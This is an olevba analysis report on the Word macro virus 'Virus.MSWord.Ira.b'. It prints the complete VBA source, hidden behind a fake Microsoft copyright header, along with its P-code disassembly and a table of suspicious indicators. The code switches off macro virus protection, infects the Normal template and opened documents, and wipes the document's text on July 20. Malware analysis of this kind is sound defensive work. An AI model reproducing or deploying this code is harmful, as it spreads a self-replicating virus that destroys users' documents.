olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ira.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ira.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' ------------------------------------------------------------------------
'               Copyright (C) 2001 Microsoft Corporation
'
' You have a royalty-free right to use, modify, reproduce and distribute
' the Sample Application Files (and/or any modified version) in any way
' you find useful, provided that you agree that Microsoft has no warranty,
' obligations or liability for any Sample Application Files.
' <---------------------------------------------------------------------->
Private Sub Document_Open()
On Error Resume Next
Dim Temp, Body As String
Dim ADocument, NTemplate As Object
Dim AFlag, NFlag As Boolean
Dim I As Integer
Const Length = 1987
Set ADocument = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
Set NTemplate = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
 Temp = "K`lzbja{/|zllj||izccv/kj|{}`vjk!"
 AFlag = True
 NFlag = True
 Options.VirusProtection = Not AFlag
 For I = 1 To Len(Temp): Body = Body + Chr(Asc(Mid(Temp, I, 1)) Xor 15): Next I
 If Day(Date) = 20 And Month(Date) = 7 Then
  With ActiveDocument
   .Range.Delete
   .Range.InsertBefore Body
   .UndoClear
   .Save
  End With: End
 End If
 If NTemplate.CountOfLines <> 0 Then
  Temp = NTemplate.Lines(1, NTemplate.CountOfLines)
 End If
 If InStr(Temp, "' " + String(72, "-")) = 0 Then
  If InStr(Temp, "Document_Open") = 0 Then NFlag = False
 Else
  Body = Temp: Temp = ""
 End If
 If ADocument.CountOfLines <> 0 Then
  Temp = ADocument.Lines(1, ADocument.CountOfLines)
 End If
 If InStr(Temp, "' " + String(72, "-")) = 0 Then
  If InStr(Temp, "Document_Open") = 0 Then AFlag = False
 Else
  Body = Temp: Temp = ""
 End If
 Body = Mid$(Body, InStr(Body, "' " + String(72, "-")), Length)
 If NFlag = False Then
  NTemplate.InsertLines 1, Body
  NormalTemplate.Save
 End If
 If AFlag = False Then
  ADocument.InsertLines 1, Body
  ActiveDocument.Save
 End If
' Çÿç÷åÿ#/ð/äñîäñ/ýêîð...
' Þêÿ·ìï/'ì!Ú!#=??>ì!&
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ira.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 4792 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0049 " ------------------------------------------------------------------------"
' Line #1:
' 	QuoteRem 0x0000 0x0037 "               Copyright (C) 2001 Microsoft Corporation"
' Line #2:
' 	QuoteRem 0x0000 0x0000 ""
' Line #3:
' 	QuoteRem 0x0000 0x0047 " You have a royalty-free right to use, modify, reproduce and distribute"
' Line #4:
' 	QuoteRem 0x0000 0x0046 " the Sample Application Files (and/or any modified version) in any way"
' Line #5:
' 	QuoteRem 0x0000 0x0049 " you find useful, provided that you agree that Microsoft has no warranty,"
' Line #6:
' 	QuoteRem 0x0000 0x003B " obligations or liability for any Sample Application Files."
' Line #7:
' 	QuoteRem 0x0000 0x0049 " <---------------------------------------------------------------------->"
' Line #8:
' 	FuncDefn (Private Sub Document_Open())
' Line #9:
' 	OnError (Resume Next) 
' Line #10:
' 	Dim 
' 	VarDefn Temp
' 	VarDefn Body (As String)
' Line #11:
' 	Dim 
' 	VarDefn ADocument
' 	VarDefn NTemplate (As Object)
' Line #12:
' 	Dim 
' 	VarDefn AFlag
' 	VarDefn NFlag (As Boolean)
' Line #13:
' 	Dim 
' 	VarDefn I (As Integer)
' Line #14:
' 	Dim (Const) 
' 	LitDI2 0x07C3 
' 	VarDefn Length
' Line #15:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set ADocument 
' Line #16:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set NTemplate 
' Line #17:
' 	LitStr 0x0020 "K`lzbja{/|zllj||izccv/kj|{}`vjk!"
' 	St Temp 
' Line #18:
' 	LitVarSpecial (True)
' 	St AFlag 
' Line #19:
' 	LitVarSpecial (True)
' 	St NFlag 
' Line #20:
' 	Ld AFlag 
' 	Not 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #21:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Temp 
' 	FnLen 
' 	For 
' 	BoS 0x0000 
' 	Ld Body 
' 	Ld Temp 
' 	Ld I 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x000F 
' 	Xor 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St Body 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #22:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0014 
' 	Eq 
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0007 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #23:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #24:
' 	MemLdWith Range 
' 	ArgsMemCall Delete 0x0000 
' Line #25:
' 	Ld Body 
' 	MemLdWith Range 
' 	ArgsMemCall InsertBefore 0x0001 
' Line #26:
' 	ArgsMemCallWith UndoClear 0x0000 
' Line #27:
' 	ArgsMemCallWith Save 0x0000 
' Line #28:
' 	EndWith 
' 	BoS 0x0000 
' 	End 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	Ld NTemplate 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #31:
' 	LitDI2 0x0001 
' 	Ld NTemplate 
' 	MemLd CountOfLines 
' 	Ld NTemplate 
' 	ArgsMemLd Lines 0x0002 
' 	St Temp 
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	Ld Temp 
' 	LitStr 0x0002 "' "
' 	LitDI2 0x0048 
' 	LitStr 0x0001 "-"
' 	ArgsLd String$ 0x0002 
' 	Add 
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #34:
' 	Ld Temp 
' 	LitStr 0x000D "Document_Open"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St NFlag 
' 	EndIf 
' Line #35:
' 	ElseBlock 
' Line #36:
' 	Ld Temp 
' 	St Body 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St Temp 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	Ld ADocument 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #39:
' 	LitDI2 0x0001 
' 	Ld ADocument 
' 	MemLd CountOfLines 
' 	Ld ADocument 
' 	ArgsMemLd Lines 0x0002 
' 	St Temp 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	Ld Temp 
' 	LitStr 0x0002 "' "
' 	LitDI2 0x0048 
' 	LitStr 0x0001 "-"
' 	ArgsLd String$ 0x0002 
' 	Add 
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #42:
' 	Ld Temp 
' 	LitStr 0x000D "Document_Open"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St AFlag 
' 	EndIf 
' Line #43:
' 	ElseBlock 
' Line #44:
' 	Ld Temp 
' 	St Body 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St Temp 
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	Ld Body 
' 	Ld Body 
' 	LitStr 0x0002 "' "
' 	LitDI2 0x0048 
' 	LitStr 0x0001 "-"
' 	ArgsLd String$ 0x0002 
' 	Add 
' 	FnInStr 
' 	Ld Length 
' 	ArgsLd Mid$$ 0x0003 
' 	St Body 
' Line #47:
' 	Ld NFlag 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #48:
' 	LitDI2 0x0001 
' 	Ld Body 
' 	Ld NTemplate 
' 	ArgsMemCall InsertLines 0x0002 
' Line #49:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #50:
' 	EndIfBlock 
' Line #51:
' 	Ld AFlag 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #52:
' 	LitDI2 0x0001 
' 	Ld Body 
' 	Ld ADocument 
' 	ArgsMemCall InsertLines 0x0002 
' Line #53:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	QuoteRem 0x0000 0x0018 " Çÿç÷åÿ#/ð/äñîäñ/ýêîð..."
' Line #56:
' 	QuoteRem 0x0000 0x0015 " Þêÿ·ìï/'ì!Ú!#=??>ì!&"
' Line #57:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

